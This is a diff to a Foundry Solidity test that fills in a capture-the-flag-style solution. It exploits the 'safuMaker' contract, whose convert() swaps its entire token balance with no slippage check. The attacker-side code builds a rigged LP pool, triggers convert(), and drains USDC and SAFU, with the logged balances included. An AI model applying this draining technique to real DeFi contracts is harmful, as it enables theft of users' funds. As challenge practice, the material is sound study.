@@ -113,45 +113,95 @@ contract Testing is Test {
 
         // implement solution here
 
-        //This time this will be not an vulerability of the code but about the logic
-        /*
+        //This time this will be not an vulerability of the code but about the logic inside safuMaker
+        
+        //First we LP the pool USDC-SAFU
         usdc.approve(address(safuRouter),type(uint).max);
-        vm.prank(admin);
         safu.approve(address(safuRouter),type(uint).max);
         safuRouter.addLiquidity(
             address(usdc),address(safu),
-            10e18,
-            10e18,
+            80e18,
+            80e18,
             0,0,
-            admin,block.timestamp
+            attacker,block.timestamp
         );
+        //LP safuPair = 80000000000000000000
 
         // --getting the USDC-SAFU trading pair
         safuPair = IUniswapV2Pair(safuFactory.getPair(address(usdc),address(safu)));
+        console.log("LP safuPair of attacker : ",safuPair.balanceOf(address(attacker)));
 
+        //Then we will create a new POOL (LP USDC-SAFU)-SAFU for our exploit 
         safuPair.approve(address(safuRouter),type(uint).max);
         safuRouter.addLiquidity(
             address(safuPair),address(safu),
             safuPair.balanceOf(attacker),
-            10e18,
+            5e18,
             0,0,
-            attacker,block.timestamp
+            address(attacker),block.timestamp
         );
-
+        //LP sifuPair = 19999999999999999000
+        
         // --getting the LP(USDC-SAFU)-SAFU trading pair
         IUniswapV2Pair sifuPair = IUniswapV2Pair(safuFactory.getPair(address(safuPair),address(safu)));
         console.log("LP sifuPair : ",sifuPair.balanceOf(address(attacker)));
 
-        sifuPair.transfer(address(safuMaker),1e18);
-        safuMaker.convert(address(safuPair),address(safu));
-
         (uint256 reserve0, uint256 reserve1, ) = sifuPair.getReserves();
+        console.log("reserveO : ",reserve0," reserve1 : ",reserve1 );
+        //reserveO :  5000000000000000000  reserve1 :  80000000000000000000
 
-        console.log("reserveO : ",reserve0," reserve1 : ",reserve1 );*/
+        //Now wz will proceed the exploit
+        //When we are calling  convert() from safuMaker it will burn the lp of the pool and then convert the entire balance of one of the token into SAFU token
+        // That's the point the ENTIRE balance and not the amount get from the burn of the LP due to L97-98 inside safuMaker.sol
+        //So if we send some LP of the sifuPair to safuMaker and then call convert()
+        //SafuMaker will burn the LP, he will get LP(USDC-SAFU) and SAFU token
+        //And then he will swap all the LP(USDC-SAFU) to SAFU with our pool sifuPair
+        //Because safuMaker directly call the swap() function of univ2 there is no check about amountMin for example
+        //at the end of the swap safuMaker will get the 5e18 SAFU token of the pool sifuPair but he will loose 10_000e18 of LP(USDC-SAFU) 
+        //Now the sifuPair has almost none SAFU token and lot of LP(USDC-SAFU)
+        //The attacker is the only LP of the sifuPair 
+        //When removing liquidity, the attacker will get all the LP(USDC-SAFU)
+        //Then attacker can remove liquidity of the safuPair and get USDC and SAFU
+        console.log("balance token SAFU of bar address of safuMaker : ",safu.balanceOf(address(0x1111111111111111111111111111111111111111)));
+        // = 0
+        console.log("LP safuPair of safuMaker: ",safuPair.balanceOf(address(safuMaker)));
+        // = 10000000000000000000000
 
+        sifuPair.transfer(address(safuMaker),1e18); //don't care about the amount
+        safuMaker.convert(address(safuPair),address(safu)); //proceed to exploit
+        
+        console.log("balance token SAFU of bar address of safuMaker : ",safu.balanceOf(address(0x1111111111111111111111111111111111111111)));
+        // = 4964079559099971064 , safuMaker got ~= 5e18
+        console.log("LP safuPair of safuMaker: ",safuPair.balanceOf(address(safuMaker)));
+        // = 0 , safuMaker loose all LP
 
+        (reserve0,reserve1, ) = sifuPair.getReserves();
+        console.log("reserveO : ",reserve0," reserve1 : ",reserve1 );
+        // reserveO :  35920440900028936  reserve1 :  10080000000000000000000
 
+        //remove liquidity in order to get SAFU and LP(USDC-SAFU)
+        sifuPair.approve(address(safuRouter),type(uint).max);
+        safuRouter.removeLiquidity(
+            address(safuPair),address(safu),
+            sifuPair.balanceOf(attacker),
+            0,0,
+            address(attacker),block.timestamp
+        );
 
+        console.log("LP safuPair of attacker: ",safuPair.balanceOf(address(attacker)));
+        // LP safuPair of attacker:  10077497135616033822768
+
+        // //remove liquidity in order to get SAFU and USDC
+        safuRouter.removeLiquidity(
+            address(usdc),address(safu),
+            safuPair.balanceOf(attacker),
+            0,0,
+            address(attacker),block.timestamp
+        );
+        console.log("usdc attacker : ",usdc.balanceOf(address(attacker)));
+        // usdc attacker :  10097497135616033822768
+        console.log("safu attacker : ",safu.balanceOf(address(attacker)));
+        // safu attacker :  10092533047137887007949
 
         vm.stopPrank();
         validation();
